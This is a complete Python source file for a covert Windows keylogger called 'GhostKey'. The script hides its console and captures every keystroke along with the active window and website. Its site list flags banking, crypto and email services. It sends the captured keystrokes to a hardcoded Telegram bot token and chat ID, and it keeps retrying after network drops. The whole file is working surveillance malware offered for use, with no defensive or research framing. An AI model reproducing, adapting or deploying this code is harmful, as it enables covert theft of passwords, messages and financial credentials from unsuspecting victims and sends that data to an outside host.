#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GhostKey — Resilient, Zero-Dependency Keylogger
- Pure Windows API + Python stdlib (no pynput / pywin32 / requests needed)
- Captures keystrokes incl. arrows, CapsLock, Enter, Backspace, F-keys, numpad
- Tracks active window / website for every keystroke
- Telegram exfil; survives WiFi delays & internet drops
- Single-instance mutex + crash logging for boot troubleshooting
"""

import ctypes
import json
import os
import queue
import re
import socket
import sys
import threading
import time
import traceback
import urllib.request
from ctypes import POINTER, c_int, c_ulong, c_wchar_p
from datetime import datetime

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8810561403:AAHuEYEJa1NjlpiLOHWdCghoe0mS3dYRey8"
CHAT_ID = "6438143115"
SEND_INTERVAL = 300           # seconds between reports (300 = 5 min)
HOSTNAME = os.environ.get("COMPUTERNAME", "unknown")   # fixed: no more hardcode
USERNAME = os.environ.get("USERNAME", "unknown")
DEBUG_FILE = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "ghostkey_debug.txt")

# ============================================================
# DEBUG LOGGING — pythonw hides errors, this makes them visible
# ============================================================
def _log(msg):
    try:
        with open(DEBUG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except Exception:
        pass

# ============================================================
# WIN32 API (explicit prototypes — 64-bit safe)
# ============================================================
user32 = ctypes.windll.user32
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

GetAsyncKeyState = user32.GetAsyncKeyState
GetAsyncKeyState.argtypes = [ctypes.c_int]
GetAsyncKeyState.restype = ctypes.c_short

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = [ctypes.c_int]
GetKeyState.restype = ctypes.c_short

GetForegroundWindow = user32.GetForegroundWindow
GetForegroundWindow.restype = ctypes.c_void_p

IsWindowVisible = user32.IsWindowVisible
IsWindowVisible.argtypes = [ctypes.c_void_p]
IsWindowVisible.restype = ctypes.c_int

GetWindowTextW = user32.GetWindowTextW
GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
GetWindowTextW.restype = ctypes.c_int

GetWindowThreadProcessId = user32.GetWindowThreadProcessId
GetWindowThreadProcessId.argtypes = [ctypes.c_void_p, POINTER(c_ulong)]
GetWindowThreadProcessId.restype = c_ulong

GetConsoleWindow = kernel32.GetConsoleWindow
GetConsoleWindow.restype = ctypes.c_void_p

ShowWindow = user32.ShowWindow
ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [c_ulong, c_int, c_ulong]
OpenProcess.restype = ctypes.c_void_p

QueryFullProcessImageNameW = kernel32.QueryFullProcessImageNameW
QueryFullProcessImageNameW.argtypes = [c_void_p, c_ulong, c_wchar_p, POINTER(c_ulong)]
QueryFullProcessImageNameW.restype = c_int

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [ctypes.c_void_p]
CloseHandle.restype = c_int

CreateMutexW = kernel32.CreateMutexW
CreateMutexW.restype = ctypes.c_void_p
CreateMutexW.argtypes = [ctypes.c_void_p, c_int, c_wchar_p]

# Hide console (no-op under --noconsole / pythonw)
try:
    ShowWindow(GetConsoleWindow(), 0)
except Exception:
    pass

# ============================================================
# KEY MAPPING (specials checked FIRST so arrows/CAPS work)
# ============================================================
SHIFT_SYMBOLS = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
    '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
    ';': ':', "'": '"', ',': '<', '.': '>', '/': '?', '`': '~'
}

# VK codes never logged (mouse + modifiers) — keeps reports clean
SKIP_KEYS = {0x01, 0x02, 0x04, 0x05, 0x10, 0x11, 0x12, 0x5B, 0x5C}

SPECIAL_KEYS = {
    13: "\n", 8: "[BACK]", 9: "[TAB]", 27: "[ESC]",
    37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
    45: "[INS]", 46: "[DEL]", 36: "[HOME]", 35: "[END]",
    33: "[PGUP]", 34: "[PGDN]", 144: "[NUMLOCK]", 20: "[CAPS]",
    112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]",
    116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]",
    120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]"
}

NUMPAD_MAP = {
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4', 101: '5',
    102: '6', 103: '7', 104: '8', 105: '9', 106: '*', 107: '+',
    108: "[NPDEL]", 109: '-', 110: '.', 111: '/'
}

def get_key_name(key_code, shift, caps):
    """VK -> display string. Specials and numpad first, printable second."""
    if key_code in SPECIAL_KEYS:
        return SPECIAL_KEYS[key_code]
    if key_code in NUMPAD_MAP:
        return NUMPAD_MAP[key_code]
    if 32 <= key_code <= 126:
        ch = chr(key_code)
        if ch.isalpha():
            ch = ch.upper() if (shift ^ caps) else ch.lower()
        elif shift and ch in SHIFT_SYMBOLS:
            ch = SHIFT_SYMBOLS[ch]
        return ch
    return ""

# ============================================================
# WEBSITE / WINDOW DETECTION
# ============================================================
KNOWN_SITES = [
    "gmail", "google", "youtube", "github", "reddit", "twitter", "x.com",
    "facebook", "instagram", "linkedin", "netflix", "amazon", "ebay",
    "stack overflow", "stackoverflow", "wikipedia", "medium", "discord",
    "slack", "notion", "trello", "jira", "confluence", "outlook",
    "microsoft 365", "office", "dropbox", "drive", "docs", "sheets",
    "slides", "whatsapp", "telegram", "signal", "zoom", "teams",
    "meet", "calendar", "maps", "news", "finance", "translate",
    "chatgpt", "openai", "claude", "gemini", "copilot", "pinterest",
    "tumblr", "quora", "twitch", "tiktok", "snapchat", "spotify",
    "apple", "icloud", "yahoo", "bing", "duckduckgo", "adobe",
    "canva", "figma", "wordpress", "shopify", "paypal", "stripe",
    "coinbase", "binance", "bank", "crypto"
]

DOMAIN_RE = re.compile(r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/\S*)?$")

def _extract_site(title):
    """Pull the actual site name out of a browser tab title."""
    if not title:
        return "Unknown"
    parts = [p.strip() for p in title.split(" - ") if p.strip()]
    if not parts:
        return "Unknown"
    # 1) known-site match (scan from the right — site is usually last)
    for part in reversed(parts):
        low = part.lower()
        for known in KNOWN_SITES:
            if known in low:
                return part[:40]
    # 2) domain-looking part (e.g. "stackoverflow.com", "docs.google.com/...")
    for part in reversed(parts):
        if DOMAIN_RE.match(part):
            return part[:40]
    # 3) fallback: whole cleaned title
    return title[:40]

def _get_process_name(hwnd):
    """Exe name owning a window (chrome.exe / msedge.exe / ...)."""
    try:
        pid = c_ulong()
        GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if not pid.value:
            return ""
        h = OpenProcess(0x1000, False, pid.value)   # PROCESS_QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        try:
            buf = ctypes.create_unicode_buffer(512)
            size = c_ulong(512)
            QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size))
            return os.path.basename(buf.value).lower()
        finally:
            CloseHandle(h)
    except Exception:
        return ""

def _browser_label(proc):
    p = (proc or "").lower()
    if "chrome" in p:   return "Chrome"
    if "msedge" in p:   return "Edge"
    if "firefox" in p:  return "Firefox"
    if "brave" in p:    return "Brave"
    if "opera" in p:    return "Opera"
    if "vivaldi" in p:  return "Vivaldi"
    return ""

def get_active_window_info():
    """Return (title, browser_label, site_label)."""
    try:
        hwnd = GetForegroundWindow()
        if not hwnd or not IsWindowVisible(hwnd):
            return "Unknown", "", "Unknown"
        buf = ctypes.create_unicode_buffer(512)
        GetWindowTextW(hwnd, buf, 512)
        title = buf.value.strip()
        if not title:
            return "Unknown", "", "Unknown"
        proc = _get_process_name(hwnd)
        browser = _browser_label(proc)
        site = _extract_site(title)
        return title, browser, site
    except Exception:
        return "Unknown", "", "Unknown"

# ============================================================
# CORE LOGGER
# ============================================================
class GhostKey:
    def __init__(self):
        self.keystrokes = []
        self.pending_messages = queue.Queue()
        self.lock = threading.Lock()
        self.running = True
        self.pressed = set()              # held-key set (1 log per press)
        self.ctx_title = "Unknown"
        self.ctx_browser = ""
        self.ctx_site = "Unknown"

    # ---------------- comms ----------------
    @staticmethod
    def is_internet_available():
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=2)
            return True
        except OSError:
            return False

    def _send_telegram(self, message):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": message}).encode("utf-8")
        req = urllib.request.Request(
            url, data=data, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            if resp.status != 200:
                raise OSError(f"HTTP {resp.status}")

    def _safe_notify(self, text):
        msg = (f"{text}\n💻 {HOSTNAME}\\{USERNAME}\n"
               f"🕒 {datetime.now().strftime('%H:%M:%S')}")
        if self.is_internet_available():
            try:
                self._send_telegram(msg)
            except Exception:
                self.pending_messages.put(msg)
        else:
            self.pending_messages.put(msg)

    # ---------------- threads ----------------
    def _listen_keys(self):
        """GetAsyncKeyState polling — each key logged exactly once per press."""
        while self.running:
            try:
                shift = bool(GetKeyState(0x10) & 0x8000)
                caps  = bool(GetKeyState(0x14) & 0x0001)
                for key_code in range(256):
                    if key_code in SKIP_KEYS:
                        continue
                    down = bool(GetAsyncKeyState(key_code) & 0x8000)
                    if down and key_code not in self.pressed:
                        self.pressed.add(key_code)
                        key_char = get_key_name(key_code, shift, caps)
                        if not key_char:
                            continue
                        ts = datetime.now().strftime("%H:%M")
                        ctx = (f"{self.ctx_browser}:{self.ctx_site}"
                               if self.ctx_browser else self.ctx_site)[:40]
                        with self.lock:
                            self.keystrokes.append((ts, key_char, ctx))
                            if len(self.keystrokes) > 20000:
                                del self.keystrokes[:5000]
                    elif not down and key_code in self.pressed:
                        self.pressed.discard(key_code)
                time.sleep(0.02)           # 20ms poll — catches fast typists
            except Exception:
                time.sleep(1)

    def _window_watcher(self):
        """Refresh window/browser/site context every 0.5s."""
        while self.running:
            try:
                t, b, s = get_active_window_info()
                self.ctx_title, self.ctx_browser, self.ctx_site = t, b, s
            except Exception:
                pass
            time.sleep(0.5)

    def _sender(self):
        time.sleep(60)                     # initial delay for first keystrokes
        while self.running:
            time.sleep(SEND_INTERVAL)
            with self.lock:
                if not self.keystrokes:
                    continue
                data = self.keystrokes.copy()
                self.keystrokes.clear()
            if data:
                self._send_logs(data)

    def _pending_sender(self):
        """Flush queued messages whenever internet returns."""
        while self.running:
            try:
                msg = self.pending_messages.get(timeout=30)
                while not self.is_internet_available():
                    time.sleep(10)
                self._send_telegram(msg)
            except queue.Empty:
                continue
            except Exception:
                time.sleep(10)

    def _keep_alive(self):
        """Heartbeat every 30 min to confirm it's still running."""
        time.sleep(600)
        while self.running:
            time.sleep(1800)
            if self.is_internet_available():
                with self.lock:
                    recent = len(self.keystrokes)
                self._safe_notify(f"💓 Heartbeat — {recent} pending keystrokes")
            else:
                _log("Internet down during heartbeat")

    def _send_logs(self, data):
        lines = ["📝 Keystroke Report",
                 f"💻 {HOSTNAME}\\{USERNAME}",
                 f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M')}", ""]
        contexts = {}
        for ts, key, ctx in data:
            contexts.setdefault(ctx, []).append((ts, key))
        for ctx, keys in sorted(contexts.items(),
                                key=lambda x: -len(x[1]))[:10]:
            lines.append(f"🌐 [{ctx}] ({len(keys)} keys)")
            text = "".join(k for _, k in keys
                           if len(k) == 1 or k.startswith("["))
            if text.strip():
                lines.append("  └ " + text[:500])
            lines.append("")
        lines.append(f"✨ Total: {len(data)} keys · {len(contexts)} sites")
        message = "\n".join(lines)
        if len(message) > 4000:
            message = message[:3997] + "..."
        if self.is_internet_available():
            try:
                self._send_telegram(message)
            except Exception:
                self.pending_messages.put(message)
        else:
            self.pending_messages.put(message)

    def start(self):
        _log("GhostKey started")
        # wait for internet before anything (WiFi may connect late at boot)
        while not self.is_internet_available():
            time.sleep(5)
        _log("Internet detected")
        threading.Thread(target=self._listen_keys, daemon=True).start()
        threading.Thread(target=self._window_watcher, daemon=True).start()
        threading.Thread(target=self._sender, daemon=True).start()
        threading.Thread(target=self._pending_sender, daemon=True).start()
        threading.Thread(target=self._keep_alive, daemon=True).start()
        self._safe_notify("🟢 Agent online")
        while self.running:
            time.sleep(1)

# ============================================================
# ENTRY
# ============================================================
if __name__ == "__main__":
    _log(f"[BOOT] launched, python={sys.executable}")

    # single instance (per-user mutex)
    try:
        CreateMutexW(None, False, "GhostKey_SingleInstance_" + USERNAME)
        if ctypes.get_last_error() == 183:      # ERROR_ALREADY_EXISTS
            _log("Another instance already running — exiting.")
            sys.exit(0)
    except Exception:
        pass

    try:
        GhostKey().start()
    except Exception:
        _log("FATAL: " + traceback.format_exc())
        sys.exit(1)
